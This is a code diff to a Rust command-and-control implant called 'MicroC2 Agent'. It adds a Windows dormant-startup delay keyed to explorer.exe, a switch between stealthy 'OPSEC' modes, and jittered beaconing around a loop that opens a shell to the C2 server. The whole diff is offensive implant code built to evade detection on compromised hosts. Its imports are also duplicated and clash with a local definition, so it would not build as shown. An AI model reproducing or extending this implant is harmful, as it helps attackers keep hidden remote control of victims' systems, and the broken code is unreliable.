@@ -13,13 +13,49 @@ use networking::socks5_pivot::Socks5PivotHandler;
 use crate::networking::socks5_pivot_server::Socks5PivotServer;
 use crate::opsec::{detect_opsec_level, OpsecLevel};
 use std::sync::Arc;
+use crate::opsec::{determine_agent_mode, AgentMode, OpsecState};
+use once_cell::sync::Lazy;
+use std::sync::Mutex;
+use crate::opsec::{determine_agent_mode, OPSEC_STATE, AgentMode};
+
+static OPSEC_STATE: Lazy<Mutex<OpsecState>> = Lazy::new(|| Mutex::new(OpsecState {
+    mode: AgentMode::FullOpsec,
+    last_transition: std::time::Instant::now(),
+}));
+
+fn random_jitter(base: u64, jitter: u64) -> u64 {
+    let mut rng = rand::thread_rng();
+    base + rng.gen_range(0..=jitter)
+}
+
+// Dormant startup function
+// This function is called on Windows to wait for the system to be idle before starting the agent
+// It checks for the presence of explorer.exe and waits for up to 10 minutes
+#[cfg(target_os = "windows")]
+fn dormant_startup() {
+    use sysinfo::{System, SystemExt, ProcessExt};
+    let mut sys = System::new_all();
+    let start = std::time::Instant::now();
+    // Wait up to 10 minutes or until explorer.exe is running
+    while start.elapsed().as_secs() < 600 {
+        sys.refresh_processes();
+        if sys.processes_by_name("explorer.exe").next().is_some() {
+            break;
+        }
+        std::thread::sleep(std::time::Duration::from_secs(5));
+    }
+}
+
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
+    #[cfg(target_os = "windows")]
+    dormant_startup();
+
     env_logger::init();
-    println!("[STARTUP] MicroC2 Agent starting...");
-    
-    let config = AgentConfig::load()?; // Make sure this returns the right error type
+    info!("[STARTUP] MicroC2 Agent starting...");
+
+    let config = AgentConfig::load()?;
     info!("[CONFIG] Loaded agent config: {:?}", config);
 
     // Channel for pivot frames
@@ -61,15 +97,40 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     info!("[AGENT] Starting main loop. Agent ID: {}", agent_id);
     loop {
+        let new_mode = determine_agent_mode();
+        {
+            let mut state = OPSEC_STATE.lock().unwrap();
+            if state.mode != new_mode {
+                info!("[OPSEC] Mode transition: {:?} -> {:?}", state.mode, new_mode);
+                state.mode = new_mode;
+                state.last_transition = std::time::Instant::now();
+            }
+        }
+
+        match new_mode {
+            AgentMode::FullOpsec => {
+                // Minimize activity: long sleep, no heavy ops, delay tasks
+                log::debug!("[OPSEC] Full OPSEC: minimizing activity.");
+                // e.g. skip non-urgent commands, rate limit
+            }
+            AgentMode::BackgroundOpsec => {
+                // Higher beaconing, process queued commands, allow heavier ops
+                log::debug!("[OPSEC] Background OPSEC: can process queued tasks.");
+            }
+        }
+
         info!("[NETWORK] Attempting connection to C2: {}", server_addr);
         if let Err(e) = run_shell(&server_addr, &agent_id, pivot_handler.clone(), pivot_tx.clone()).await {
             error!("[ERROR] Shell error: {}. Retrying...", e);
             time::sleep(Duration::from_secs(5)).await;
         }
         
-        let mut rng = rand::thread_rng();
-        let sleep_time = config.sleep_interval + rng.gen_range(0..config.jitter);
-        info!("[AGENT] Sleeping for {} seconds before next attempt", sleep_time);
-        time::sleep(Duration::from_secs(sleep_time)).await;
+        let (base, jitter) = match new_mode {
+            AgentMode::FullOpsec => (600, 120),         // 10-12 min
+            AgentMode::BackgroundOpsec => (60, 30),     // 1-1.5 min
+        };
+        let sleep_time = random_jitter(base, jitter);
+        info!("[OPSEC] Sleeping for {} seconds (mode: {:?})", sleep_time, new_mode);
+        tokio::time::sleep(std::time::Duration::from_secs(sleep_time)).await;
     }
 }
